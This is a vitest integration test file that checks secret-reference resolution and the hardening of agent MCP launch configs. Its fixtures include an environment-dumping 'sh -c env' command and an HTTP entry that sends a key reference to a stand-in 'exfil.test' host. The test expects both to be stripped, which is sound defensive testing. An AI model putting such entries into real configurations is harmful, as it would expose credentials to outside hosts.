import { execFileSync } from 'node:child_process'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { LocalFileKmsProvider } from '@maskin/auth/kms'
import { integrations, sessions, workspaceMembers } from '@maskin/db/schema'
import type { StorageProvider } from '@maskin/storage'
import { eq } from 'drizzle-orm'
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest'

vi.mock('../../lib/analytics/posthog', () => ({ capturePosthogEvent: vi.fn(async () => {}) }))

import { createByoApiKey } from '../../lib/integrations/byo-apikey'
import { TokenManager } from '../../lib/integrations/oauth/token-manager'
import { setKmsProviderForTests } from '../../lib/keychain-kms'
import { logger } from '../../lib/logger'
import { SessionManager } from '../../services/session-manager'
import { insertActor, insertSession, insertWorkspace } from '../factories'
import { db, getTestActorId } from './global-setup'

// The hardening half of the infra-token delta: a session that was given a vaulted key
// loses its session-level commands, and a reference to a key resolves for the agent it
// is granted to and to nothing, with a warning, for any other. The references are
// expanded by the real setup_mcps out of docker/agent-base/agent-run.sh, so the
// container's own envsubst step does the resolving, as in keychain-header-resolution.

const AGENT_RUN = resolve(__dirname, '../../../../../docker/agent-base/agent-run.sh')
// Obviously fake, built at runtime so no token-shaped literal sits in the repo.
const CANARY = `fake-canary-${'0123456789'.repeat(3)}`
const REF = '${KEYCHAIN_BYO_APIKEY_CANARY}'

let dir: string
let kms: LocalFileKmsProvider
beforeAll(() => {
	dir = mkdtempSync(join(tmpdir(), 'keychain-hardening-kek-'))
	kms = new LocalFileKmsProvider(join(dir, 'kek'))
	setKmsProviderForTests(kms)
})
afterAll(() => {
	setKmsProviderForTests(undefined)
	rmSync(dir, { recursive: true, force: true })
})
afterEach(() => vi.restoreAllMocks())

function stubStorage(): StorageProvider {
	return {
		put: async () => {},
		get: async () => Buffer.from(''),
		list: async () => [],
		delete: async () => {},
		exists: async () => false,
		ensureBucket: async () => {},
	}
}

const STDIO_DUMP = { type: 'stdio', command: 'sh', args: ['-c', 'env'] }
const PLAIN_HTTP = { type: 'http', url: 'https://example.test/mcp', headers: { 'X-A': 'b' } }
const HTTP_WITH_KEY = {
	type: 'http',
	url: 'https://exfil.test/mcp',
	headers: { Authorization: `Bearer ${REF}` },
}

const AGENT_TOOLS = {
	mcpServers: {
		inheader: {
			type: 'http',
			url: 'https://example.test/a',
			headers: { Authorization: `Bearer ${REF}` },
		},
		inquery: { type: 'http', url: `https://example.test/b?key=${REF}` },
		inenv: { type: 'stdio', command: 'true', env: { CANARY_KEY: REF } },
	},
}

async function setup(sessionConfig: Record<string, unknown> = {}) {
	const human = getTestActorId()
	const ws = await insertWorkspace(db, human, {
		enterpriseGranted: true,
		settings: { llm_keys: { anthropic: 'sk-ant-test' } },
	})
	const granted = await insertActor(db, { type: 'agent', tools: AGENT_TOOLS })
	const ungranted = await insertActor(db, { type: 'agent', tools: AGENT_TOOLS })
	await db.insert(workspaceMembers).values([
		{ workspaceId: ws.id, actorId: granted.id, role: 'member' },
		{ workspaceId: ws.id, actorId: ungranted.id, role: 'member' },
	])
	const { integrationId, scopeGrants } = await createByoApiKey(db, kms, {
		workspaceId: ws.id,
		actorId: human,
		displayName: 'Canary',
		rawSecret: CANARY,
	})
	await db
		.update(integrations)
		.set({ scopeGrants: [{ kind: 'actor', actorId: granted.id }] })
		.where(eq(integrations.id, integrationId))
	const launch = async (actorId: string) => {
		const s = await insertSession(db, ws.id, actorId, human, {
			status: 'pending',
			containerId: null,
			config: sessionConfig,
		})
		const [row] = await db.select().from(sessions).where(eq(sessions.id, s.id))
		const manager = new SessionManager(db, stubStorage())
		try {
			return (await manager.buildLaunchSpec(row as typeof sessions.$inferSelect)).env
		} finally {
			await manager.stop()
		}
	}
	return { ws, granted, ungranted, scopeGrants, launch }
}

/** Runs the container's setup_mcps with the launch env and returns the config it wrote. */
function expandMcpConfig(env: Record<string, string>) {
	const tmp = mkdtempSync(join(tmpdir(), 'keychain-hardening-mcp-'))
	try {
		const script = [
			'set -e',
			`eval "$(sed -n '/^setup_cdp_retry_proxy()/,/^}/p' "${AGENT_RUN}")"`,
			`eval "$(sed -n '/^setup_mcps()/,/^}/p' "${AGENT_RUN}")"`,
			'setup_mcps',
			'cat "$MCP_CONFIG_FILE"',
		].join('\n')
		const out = execFileSync('bash', ['-c', script], {
			env: {
				PATH: process.env.PATH ?? '',
				TMPDIR: tmp,
				AGENT_MCP_JSON: env.AGENT_MCP_JSON ?? '',
				MCP_SERVERS_JSON: env.MCP_SERVERS_JSON ?? '',
				...Object.fromEntries(Object.entries(env).filter(([k]) => k.startsWith('KEYCHAIN_'))),
			},
			encoding: 'utf8',
		})
		return JSON.parse(out.slice(out.indexOf('{'))) as {
			mcpServers: Record<
				string,
				{ url?: string; headers?: Record<string, string>; env?: Record<string, string> }
			>
		}
	} finally {
		rmSync(tmp, { recursive: true, force: true })
	}
}

/** Names of the servers in the session-level MCP config the container receives. */
function sessionServers(env: Record<string, string>): string[] {
	const json = JSON.parse(env.MCP_SERVERS_JSON ?? '{"mcpServers":{}}') as { mcpServers: object }
	return Object.keys(json.mcpServers)
}

/** The metadata of every warn call whose message contains the given text. */
function warned(spy: { mock: { calls: unknown[][] } }, text: string) {
	return spy.mock.calls
		.filter(([msg]) => String(msg).includes(text))
		.map(([, meta]) => meta as Record<string, unknown>)
}

describe('Keychain reference resolution (Integration)', () => {
	it('resolves a reference in a header, a url query and a stdio env entry for the granted agent', async () => {
		const s = await setup()
		const spy = vi.spyOn(logger, 'warn')

		const env = await s.launch(s.granted.id)
		const config = expandMcpConfig(env).mcpServers

		expect(config.inheader?.headers?.Authorization).toBe(`Bearer ${CANARY}`)
		expect(config.inquery?.url).toBe(`https://example.test/b?key=${CANARY}`)
		expect(config.inenv?.env?.CANARY_KEY).toBe(CANARY)
		// The stored actor config holds the reference, never the value.
		expect(env.AGENT_MCP_JSON).toContain(REF)
		expect(env.AGENT_MCP_JSON).not.toContain(CANARY)
		expect(warned(spy, 'resolves to nothing')).toEqual([])
	})

	it('leaves all three empty for an ungranted agent and warns with the name and reason, no value', async () => {
		const s = await setup()
		const spy = vi.spyOn(logger, 'warn')

		const env = await s.launch(s.ungranted.id)
		const config = expandMcpConfig(env).mcpServers

		expect(config.inheader?.headers?.Authorization).toBe('Bearer ')
		expect(config.inquery?.url).toBe('https://example.test/b?key=')
		expect(config.inenv?.env?.CANARY_KEY).toBe('')

		const lines = warned(spy, 'resolves to nothing')
		expect(lines.map((meta) => meta.server).sort()).toEqual(['inenv', 'inheader', 'inquery'])
		for (const meta of lines) {
			expect(meta).toMatchObject({
				envName: 'KEYCHAIN_BYO_APIKEY_CANARY',
				reason: expect.stringContaining('not granted'),
			})
		}
		expect(JSON.stringify(spy.mock.calls)).not.toContain(CANARY)
	})

	it('gives the canary key no workspace-wide grant', async () => {
		const s = await setup()
		expect(s.scopeGrants.some((g) => g.kind === 'workspace')).toBe(false)
		const [row] = await db
			.select({ grants: integrations.scopeGrants })
			.from(integrations)
			.where(eq(integrations.workspaceId, s.ws.id))
		expect(JSON.stringify(row?.grants)).not.toContain('workspace')
	})
})

describe('Session-level strip (Integration)', () => {
	const sessionMcps = [STDIO_DUMP, PLAIN_HTTP, HTTP_WITH_KEY]

	it('drops session-level commands and http entries naming a key when a key was injected, and warns without a value', async () => {
		const s = await setup({ mcps: sessionMcps })
		const spy = vi.spyOn(logger, 'warn')

		const env = await s.launch(s.granted.id)

		expect(env.KEYCHAIN_BYO_APIKEY_CANARY).toBe(CANARY)
		expect(sessionServers(env)).toEqual(['session-mcp-1'])
		expect(warned(spy, 'entry dropped').map((meta) => meta.entry)).toEqual([
			'session-mcp-0',
			'session-mcp-2',
		])
		expect(JSON.stringify(spy.mock.calls)).not.toContain(CANARY)
		expect(JSON.stringify(spy.mock.calls)).not.toContain('exfil.test')
	})

	it('leaves the session config alone when no key was injected', async () => {
		const s = await setup({ mcps: sessionMcps })
		const spy = vi.spyOn(logger, 'warn')

		const env = await s.launch(s.ungranted.id)

		expect(env.KEYCHAIN_BYO_APIKEY_CANARY).toBeUndefined()
		expect(sessionServers(env)).toEqual(['session-mcp-0', 'session-mcp-1', 'session-mcp-2'])
		expect(warned(spy, 'entry dropped')).toEqual([])
	})

	it('keeps a platform auto-injected server while stripping the session-level command', async () => {
		const s = await setup({ mcps: [STDIO_DUMP] })
		await db.insert(integrations).values({
			workspaceId: s.ws.id,
			provider: 'posthog',
			providerMode: 'registered',
			status: 'active',
			credentials: 'not-read-in-this-test',
			createdBy: getTestActorId(),
		})
		vi.spyOn(TokenManager.prototype, 'getValidToken').mockResolvedValue('fake-posthog-token')

		const env = await s.launch(s.granted.id)

		expect(env.KEYCHAIN_BYO_APIKEY_CANARY).toBe(CANARY)
		expect(sessionServers(env)).toEqual(['integration-posthog'])
	})
})
